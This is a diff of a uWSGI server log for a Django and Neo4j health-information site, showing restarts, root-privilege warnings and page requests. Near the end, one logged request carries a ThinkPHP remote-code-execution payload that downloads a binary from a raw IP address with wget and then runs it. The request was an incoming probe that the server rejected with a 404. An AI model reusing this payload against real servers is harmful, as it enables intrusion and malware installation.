-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x12121f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x12121f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 25543, cores: 2)
-spawned uWSGI worker 2 (pid: 25544, cores: 2)
-spawned uWSGI worker 3 (pid: 25545, cores: 2)
-spawned uWSGI worker 4 (pid: 25546, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 06:32:31 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 25543)...
-Gracefully killing worker 2 (pid: 25544)...
-Gracefully killing worker 3 (pid: 25545)...
-Gracefully killing worker 4 (pid: 25546)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:32:32 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xa871f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xa871f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 27295, cores: 2)
-spawned uWSGI worker 2 (pid: 27296, cores: 2)
-spawned uWSGI worker 3 (pid: 27297, cores: 2)
-spawned uWSGI worker 4 (pid: 27298, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 06:33:12 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 27295)...
-Gracefully killing worker 2 (pid: 27296)...
-Gracefully killing worker 3 (pid: 27297)...
-Gracefully killing worker 4 (pid: 27298)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:33:14 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x1a881f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1a881f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 27373, cores: 2)
-spawned uWSGI worker 2 (pid: 27374, cores: 2)
-spawned uWSGI worker 3 (pid: 27375, cores: 2)
-spawned uWSGI worker 4 (pid: 27376, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 27373|app: 0|req: 1/1] 112.10.182.10 () {42 vars in 867 bytes} [Sun Mar 17 06:41:15 2019] GET / => generated 12451 bytes in 1232 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 27373|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 931 bytes} [Sun Mar 17 06:41:16 2019] GET /views/console => generated 0 bytes in 5 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-133====10
-{'title': '哎呀，走丢了', 'abstract': '', 'url': 'javascript:void(0);'}
-[pid: 27376|app: 0|req: 1/3] 112.10.182.10 () {44 vars in 933 bytes} [Sun Mar 17 06:41:16 2019] GET /views/console/ => generated 13138 bytes in 1328 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
-[pid: 27373|app: 0|req: 3/4] 112.10.182.10 () {44 vars in 952 bytes} [Sun Mar 17 06:41:23 2019] GET /views/interlocution?id=1 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 1)
-[pid: 27376|app: 0|req: 2/5] 112.10.182.10 () {44 vars in 954 bytes} [Sun Mar 17 06:41:23 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 12 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 27373|app: 0|req: 4/6] 112.10.182.10 () {46 vars in 1010 bytes} [Sun Mar 17 06:41:51 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 27373|app: 0|req: 5/7] 112.10.182.10 () {42 vars in 720 bytes} [Sun Mar 17 06:42:05 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 27374|app: 0|req: 1/8] 112.10.182.10 () {42 vars in 753 bytes} [Sun Mar 17 06:42:05 2019] GET /views/console => generated 0 bytes in 1029 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
-371====6
-{'title': '推荐六款超人气胃病食疗方', 'abstract': '食疗很好的治疗胃病的方法，那么对于胃病的治疗，有哪些食疗偏方值得推荐？想要胃病治疗又该吃什么食物比较好呢？一起看下吧！', 'url': 'https://ys.99.com.cn/diaoyang/699187.htm'}
-[pid: 27373|app: 0|req: 6/9] 112.10.182.10 () {42 vars in 755 bytes} [Sun Mar 17 06:42:06 2019] GET /views/console/ => generated 13372 bytes in 236 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-[pid: 27374|app: 0|req: 2/10] 112.10.182.10 () {42 vars in 765 bytes} [Sun Mar 17 06:42:10 2019] GET /views/interlocution => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 1)
-[pid: 27376|app: 0|req: 3/11] 112.10.182.10 () {42 vars in 767 bytes} [Sun Mar 17 06:42:10 2019] GET /views/interlocution/ => generated 4135 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
-Not Found: /ws/chat/-1/
-[pid: 27374|app: 0|req: 3/12] 112.10.182.10 () {50 vars in 844 bytes} [Sun Mar 17 06:42:11 2019] GET /ws/chat/-1/ => generated 6826 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
-[pid: 27374|app: 0|req: 4/13] 112.10.182.10 () {44 vars in 818 bytes} [Sun Mar 17 06:46:48 2019] GET /views/interlocution/ => generated 4135 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 27374|app: 0|req: 5/14] 112.10.182.10 () {42 vars in 755 bytes} [Sun Mar 17 06:47:42 2019] GET /accounts/login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 1)
-[pid: 27373|app: 0|req: 7/15] 112.10.182.10 () {42 vars in 757 bytes} [Sun Mar 17 06:47:42 2019] GET /accounts/login/ => generated 5358 bytes in 10 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
-Not Found: /accounts/login/code.jpg
-[pid: 27374|app: 0|req: 6/16] 112.10.182.10 () {42 vars in 796 bytes} [Sun Mar 17 06:47:46 2019] GET /accounts/login/code.jpg => generated 8436 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-Not Found: /favicon.ico
-[pid: 27375|app: 0|req: 1/17] 112.10.182.10 () {42 vars in 772 bytes} [Sun Mar 17 06:47:46 2019] GET /favicon.ico => generated 6826 bytes in 1040 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
-[pid: 27374|app: 0|req: 7/18] 112.10.182.10 () {52 vars in 1115 bytes} [Sun Mar 17 06:47:53 2019] POST /accounts/login/ => generated 0 bytes in 244 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
-[pid: 27375|app: 0|req: 2/19] 112.10.182.10 () {46 vars in 951 bytes} [Sun Mar 17 06:47:53 2019] GET / => generated 12451 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-331====6
-{'title': '不同啤酒适合不同的人群', 'abstract': '现如今，啤酒的种类有很多，不同啤酒含有不同成分，味道和口感也有所不同，分别适合不同的人群饮用。下面我们来看看各种啤酒分别适合什么人群饮用。', 'url': 'https://ys.99.com.cn/zhinan/623855.htm'}
-[pid: 27373|app: 0|req: 8/20] 112.10.182.10 () {44 vars in 933 bytes} [Sun Mar 17 06:47:53 2019] GET /views/console/ => generated 13394 bytes in 360 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
-Sun Mar 17 06:47:54 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 2 (pid: 27374)...
-Gracefully killing worker 3 (pid: 27375)...
-Gracefully killing worker 4 (pid: 27376)...
-Gracefully killing worker 1 (pid: 27373)...
-worker 2 buried after 1 seconds
+Gracefully killing worker 1 (pid: 6983)...
+Gracefully killing worker 2 (pid: 6984)...
+Gracefully killing worker 3 (pid: 6989)...
+Gracefully killing worker 4 (pid: 6990)...
 worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
 worker 3 buried after 2 seconds
 worker 4 buried after 2 seconds
 binary reloading uWSGI...
@@ -726,7 +341,7 @@ closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
 found fd 3 mapped to socket 0 (127.0.0.1:8000)
 running /usr/local/bin/uwsgi
 [uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:47:56 2019] ***
+*** Starting uWSGI 2.0.18 (64bit) on [Thu Mar 21 02:27:45 2019] ***
 compiled with version: 8.3.0 on 16 March 2019 06:35:56
 os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
 nodename: VM_0_13_centos
@@ -748,7 +363,7 @@ uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x15711f0
+Python main interpreter initialized at 0x1885240
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 python threads support enabled
@@ -756,519 +371,60 @@ your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416880 bytes (407 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x15711f0 pid: 19836 (default app)
+WSGI app 0 (mountpoint='') ready in 5 seconds on interpreter 0x1885240 pid: 976 (default app)
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 *** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 28671, cores: 2)
-spawned uWSGI worker 2 (pid: 28674, cores: 2)
-spawned uWSGI worker 3 (pid: 28675, cores: 2)
-spawned uWSGI worker 4 (pid: 28676, cores: 2)
+gracefully (RE)spawned uWSGI master process (pid: 976)
+spawned uWSGI worker 1 (pid: 26527, cores: 2)
+spawned uWSGI worker 2 (pid: 26528, cores: 2)
+spawned uWSGI worker 3 (pid: 26529, cores: 2)
+spawned uWSGI worker 4 (pid: 26530, cores: 2)
 Python auto-reloader enabled
 数据库已存在！
 create neo4j class ...
 connect succeed
 数据库已存在！
-[pid: 28674|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 952 bytes} [Sun Mar 17 06:47:58 2019] GET /views/interlocution?id=1 => generated 0 bytes in 793 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
-[pid: 28674|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 954 bytes} [Sun Mar 17 06:47:59 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 22 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 28674|app: 0|req: 3/3] 112.10.182.10 () {42 vars in 784 bytes} [Sun Mar 17 06:49:08 2019] GET / => generated 11772 bytes in 60 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
-[pid: 28674|app: 0|req: 4/4] 112.10.182.10 () {44 vars in 804 bytes} [Sun Mar 17 06:49:08 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
-Sun Mar 17 06:49:09 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+[pid: 26528|app: 0|req: 1/1] 120.199.34.100 () {44 vars in 846 bytes} [Thu Mar 21 02:27:50 2019] GET /views/consoles => generated 0 bytes in 2167 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
+[pid: 26528|app: 0|req: 2/2] 120.199.34.100 () {44 vars in 848 bytes} [Thu Mar 21 02:27:52 2019] GET /views/consoles/ => generated 6594 bytes in 973 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 26527|app: 0|req: 1/3] 120.199.34.100 () {44 vars in 848 bytes} [Thu Mar 21 02:27:58 2019] GET /accounts/login/ => generated 5358 bytes in 1005 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+[pid: 26527|app: 0|req: 2/4] 120.199.34.100 () {42 vars in 774 bytes} [Thu Mar 21 02:27:59 2019] GET /favicon.ico => generated 1121 bytes in 75 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 26529|app: 0|req: 1/5] 120.199.34.100 () {42 vars in 798 bytes} [Thu Mar 21 02:27:59 2019] GET /accounts/login/code.jpg => generated 1121 bytes in 806 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 26529|app: 0|req: 2/6] 120.199.34.100 () {52 vars in 1117 bytes} [Thu Mar 21 02:28:13 2019] POST /accounts/login/ => generated 0 bytes in 204 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
+[pid: 26527|app: 0|req: 3/7] 120.199.34.100 () {46 vars in 953 bytes} [Thu Mar 21 02:28:13 2019] GET / => generated 12581 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 26527|app: 0|req: 4/8] 120.199.34.100 () {44 vars in 945 bytes} [Thu Mar 21 02:28:13 2019] GET /admin_views/general => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 1)
+数据库已存在！
+Thu Mar 21 02:28:14 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
 ...gracefully killing workers...
-Gracefully killing worker 1 (pid: 28671)...
-Gracefully killing worker 2 (pid: 28674)...
-Gracefully killing worker 4 (pid: 28676)...
-Gracefully killing worker 3 (pid: 28675)...
-数据库已存在！
-create neo4j class ...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 4 buried after 1 seconds
-connect succeed
-数据库已存在！
-288====3
-{'title': '冬季吃辣要得法 怎么健康地吃辣', 'abstract': '冬季寒凉，人们就喜欢吃辣来使身体暖和。但是冬季吃辣容易便秘、咽痛等，所以学会健康地吃辣是冬季的必修课。那么，冬季怎么健康地吃辣呢？', 'url': 'https://ys.99.com.cn/zhinan/593372.htm'}
-[pid: 28675|app: 0|req: 1/5] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 06:49:08 2019] GET /views/console/ => generated 13402 bytes in 2515 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
-worker 3 buried after 3 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:49:12 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x25c31f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x25c31f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 28826, cores: 2)
-spawned uWSGI worker 2 (pid: 28827, cores: 2)
-spawned uWSGI worker 3 (pid: 28828, cores: 2)
-spawned uWSGI worker 4 (pid: 28829, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
+Gracefully killing worker 1 (pid: 26527)...
+Gracefully killing worker 2 (pid: 26528)...
+Gracefully killing worker 3 (pid: 26529)...
+Gracefully killing worker 4 (pid: 26530)...
 create neo4j class ...
 connect succeed
 数据库已存在！
-[pid: 28828|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 06:49:13 2019] GET /accounts/login => generated 0 bytes in 781 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
-[pid: 28828|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 808 bytes} [Sun Mar 17 06:49:13 2019] GET /accounts/login/ => generated 5358 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 28827|app: 0|req: 1/3] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 06:49:13 2019] GET /accounts/login => generated 0 bytes in 773 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
-[pid: 28828|app: 0|req: 3/4] 112.10.182.10 () {44 vars in 808 bytes} [Sun Mar 17 06:49:14 2019] GET /accounts/login/ => generated 5358 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
-Not Found: /favicon.ico
-[pid: 28827|app: 0|req: 2/5] 112.10.182.10 () {38 vars in 562 bytes} [Sun Mar 17 06:49:15 2019] GET /favicon.ico => generated 6826 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
-Not Found: /accounts/login/code.jpg
-[pid: 28828|app: 0|req: 4/6] 112.10.182.10 () {42 vars in 788 bytes} [Sun Mar 17 06:49:18 2019] GET /accounts/login/code.jpg => generated 8436 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
-[pid: 28828|app: 0|req: 5/7] 112.10.182.10 () {50 vars in 1045 bytes} [Sun Mar 17 06:49:26 2019] POST /accounts/login/ => generated 0 bytes in 254 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
-[pid: 28827|app: 0|req: 3/8] 112.10.182.10 () {50 vars in 1045 bytes} [Sun Mar 17 06:49:26 2019] POST /accounts/login/ => generated 0 bytes in 342 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
-[pid: 28827|app: 0|req: 4/9] 112.10.182.10 () {46 vars in 913 bytes} [Sun Mar 17 06:49:27 2019] GET / => generated 12444 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-Sun Mar 17 06:49:27 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 28826)...
-Gracefully killing worker 3 (pid: 28828)...
-Gracefully killing worker 4 (pid: 28829)...
-Gracefully killing worker 2 (pid: 28827)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:49:28 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x245b1f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x245b1f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 28883, cores: 2)
-spawned uWSGI worker 2 (pid: 28884, cores: 2)
-spawned uWSGI worker 3 (pid: 28885, cores: 2)
-spawned uWSGI worker 4 (pid: 28886, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 28883|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 893 bytes} [Sun Mar 17 06:49:28 2019] GET /views/console => generated 0 bytes in 741 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
-389====12
-{'title': '油炸食物酥脆好吃也很伤身', 'abstract': '油炸食物是一类重油的食物，少吃是健康的保障！那么油炸食物会给身体带来哪些危害呢？如果想要了解的话，下面跟着小编一起看看吧！', 'url': 'https://ys.99.com.cn/wuqu/727878.htm'}
-[pid: 28883|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 895 bytes} [Sun Mar 17 06:49:29 2019] GET /views/console/ => generated 13374 bytes in 413 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 28886|app: 0|req: 1/3] 112.10.182.10 () {44 vars in 914 bytes} [Sun Mar 17 06:49:29 2019] GET /views/interlocution?id=2 => generated 0 bytes in 891 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
-[pid: 28886|app: 0|req: 2/4] 112.10.182.10 () {44 vars in 916 bytes} [Sun Mar 17 06:49:30 2019] GET /views/interlocution/?id=2 => generated 4233 bytes in 17 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-Not Found: /public/index.php
-[pid: 28886|app: 0|req: 3/5] 195.231.8.124 () {36 vars in 991 bytes} [Sun Mar 17 06:59:55 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://81.4.102.114/love/ai.x86%20;chmod%20777%20*%20ai.x86;%20cat%20ai.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 7100 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
-[pid: 28886|app: 0|req: 4/6] 61.7.184.43 () {32 vars in 450 bytes} [Sun Mar 17 07:41:59 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
